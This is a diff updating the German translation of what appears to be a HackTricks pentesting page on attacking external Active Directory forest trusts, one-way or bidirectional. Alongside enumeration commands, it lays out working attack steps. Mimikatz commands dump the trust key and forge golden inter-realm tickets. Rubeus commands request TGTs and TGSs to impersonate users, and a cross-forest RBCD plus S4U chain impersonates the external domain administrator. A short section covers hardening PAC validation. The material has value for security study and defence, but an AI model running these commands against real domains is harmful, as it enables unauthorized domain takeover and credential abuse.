@@ -1,12 +1,12 @@
-# Externe Forest-Domain - OneWay (Inbound) oder bidirektional
+# Externe Forest-Domäne - OneWay (Inbound) oder bidirektional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In diesem Szenario vertraut eine externe Domäne Ihnen (oder beide vertrauen einander), sodass Sie irgendeine Art von Zugriff darauf erlangen können.
+In diesem Szenario vertraut eine externe Domäne dir (oder ihr vertraut einander), sodass du Zugriff auf sie erhalten kannst.
 
 ## Enumeration
 
-Zunächst müssen Sie die **Vertrauensstellung** **enumerate**:
+Zunächst musst du den **Trust** **enumerieren**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` lassen dich schnell erkennen, ob cross-forest Missbrauchspfade (RBCD, SIDHistory) wahrscheinlich ohne zusätzliche Voraussetzungen funktionieren.
+> `SelectiveAuthentication`/`SIDFiltering*` ermöglichen es dir, schnell zu prüfen, ob Cross-Forest-Abuse-Pfade (RBCD, SIDHistory) voraussichtlich ohne zusätzliche Voraussetzungen funktionieren.<sup>[[2]](#references)</sup>
 
-In der vorherigen Enumeration wurde festgestellt, dass der Benutzer **`crossuser`** Mitglied der Gruppe **`External Admins`** ist, die **Admin access** im **DC der externen Domain** besitzt.
+Bei der vorherigen Enumeration wurde festgestellt, dass sich der Benutzer **`crossuser`** in der Gruppe **`External Admins`** befindet, die **Admin access** innerhalb des **DC der externen Domain** besitzt.
 
 ## Initial Access
 
-Wenn du keinen **speziellen** Zugriff deines Benutzers in der anderen Domain finden konntest, kannst du trotzdem zur AD Methodology zurückkehren und versuchen, **privesc from an unprivileged user** (Dinge wie kerberoasting zum Beispiel):
+Wenn du keinen **special** Zugriff deines Benutzers in der anderen Domain finden konntest, kannst du zur AD Methodology zurückkehren und versuchen, **privesc von einem unprivileged user** durchzuführen (zum Beispiel mittels Kerberoasting):
 
-Du kannst **Powerview functions** verwenden, um die **andere Domain** mit dem `-Domain` param zu **enumerate**, zum Beispiel:
+Du kannst **Powerview functions** verwenden, um die **andere Domain** mit dem `-Domain`-Parameter zu **enumerate**, wie in:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -77,26 +77,26 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ## Impersonation
 
-### Anmeldung
+### Anmelden
 
-Mit einer normalen Methode und den Zugangsdaten eines Benutzers, der Zugriff auf die externe Domain hat, sollten Sie darauf zugreifen können:
+Mit einer regulären Methode und den Zugangsdaten eines Benutzers, der Zugriff auf die externe Domäne hat, solltest du auf Folgendes zugreifen können:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID History Missbrauch
+### SID History Abuse
 
-Du kannst [**SID History**](sid-history-injection.md) auch über einen Forest-Trust ausnutzen.
+Du könntest [**SID History**](sid-history-injection.md) auch über einen Forest Trust hinweg missbrauchen.
 
-Wenn ein Benutzer **von einem Forest in einen anderen** migriert wird und **SID Filtering is not enabled**, ist es möglich, **eine SID aus dem anderen Forest hinzuzufügen**, und diese **SID** wird dem **Token des Benutzers** hinzugefügt, wenn er sich **über den Trust** authentifiziert.
+Wenn ein Benutzer **von einem Forest in einen anderen migriert** wird und **SID Filtering nicht aktiviert** ist, wird es möglich, eine **SID aus dem anderen Forest hinzuzufügen**. Diese **SID** wird dann beim **Authentifizieren über den Trust** zum **Token des Benutzers** hinzugefügt.
 
 > [!WARNING]
-> Zur Erinnerung: Du kannst den Signing Key mit
+> Zur Erinnerung: Du kannst den Signing Key mit folgendem Befehl abrufen:
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Du könntest mit dem **trusted** key ein **TGT impersonating** des Benutzers der aktuellen Domäne signieren.
+Du könntest mit dem **vertrauenswürdigen** Key ein **TGT impersonating** den Benutzer der aktuellen Domain **signieren**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -107,7 +107,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Vollständiger Ablauf zur Benutzerimpersonation
+### Vollständige Benutzer-Impersonation
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -121,9 +121,9 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Cross-forest RBCD, wenn Sie ein Computer-Konto im trusting forest kontrollieren (no SID filtering / selective auth)
+### Cross-forest RBCD, wenn du ein Maschinenkonto in der vertrauenden Gesamtstruktur kontrollierst (kein SID filtering / keine selective auth)
 
-Wenn Ihr foreign principal (FSP) Sie in eine Gruppe bringt, die Computerobjekte im trusting forest schreiben kann (z. B. `Account Operators` oder eine benutzerdefinierte Provisioning-Gruppe), können Sie **Resource-Based Constrained Delegation** auf einem Zielhost dieses Forests konfigurieren und dort jeden Benutzer impersonate:
+Wenn dein Foreign Principal (FSP) dich in eine Gruppe bringt, die Computerobjekte in der vertrauenden Gesamtstruktur schreiben kann (z. B. `Account Operators`, eine benutzerdefinierte Provisioning-Gruppe), kannst du **Resource-Based Constrained Delegation** auf einem Zielhost dieser Gesamtstruktur konfigurieren und dich dort als beliebiger Benutzer ausgeben:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,16 +134,15 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Dies funktioniert nur, wenn **SelectiveAuthentication is disabled** und **SID filtering** Ihre kontrollierende SID nicht entfernt. Es ist ein schneller lateraler Pfad, der SIDHistory forging umgeht und bei Trust-Überprüfungen häufig übersehen wird.
+Dies funktioniert nur, wenn **SelectiveAuthentication deaktiviert** ist und **SID filtering** Ihre kontrollierende SID nicht entfernt. Dies ist ein schneller lateraler Pfad, der das Fälschen von SIDHistory vermeidet und bei Trust-Überprüfungen häufig übersehen wird.<sup>[[2]](#references)</sup>
 
 ### Härtung der PAC-Validierung
 
-Aktualisierungen der PAC-Signaturvalidierung für **CVE-2024-26248**/**CVE-2024-29056** führen eine Signaturdurchsetzung für forest-übergreifende Tickets ein. In **Compatibility mode** können gefälschte inter-realm PAC/SIDHistory/S4U-Pfade auf ungepatchten DCs weiterhin funktionieren. In **Enforcement mode** werden nicht signierte oder manipulierte PAC-Daten, die einen forest trust überschreiten, abgewiesen, es sei denn, Sie besitzen außerdem den Ziel-Forest-Trust-Schlüssel. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) können dies abschwächen, solange sie verfügbar sind.
-
-
+Updates zur Validierung von PAC-Signaturen für **CVE-2024-26248**/**CVE-2024-29056** erzwingen die Signierung von Inter-Forest-Tickets. Im **Kompatibilitätsmodus** können gefälschte Inter-Realm-PAC-/SIDHistory-/S4U-Pfade auf ungepatchten DCs weiterhin funktionieren. Im **Erzwingungsmodus** werden nicht signierte oder manipulierte PAC-Daten, die eine Forest-Trust-Verbindung passieren, abgelehnt, sofern Sie nicht auch über den Trust-Schlüssel des Zielforests verfügen. Registry-Overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) können dies abschwächen, solange sie verfügbar sind.<sup>[[1]](#references)</sup>
 
 ## Referenzen
 
-- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+- [1] [Microsoft KB5037754 – Änderungen an der PAC-Validierung für CVE-2024-26248 und CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [MS-PAC-Spezifikation – Details zu SID filtering und Claims-Transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+
 {{#include ../../banners/hacktricks-training.md}}
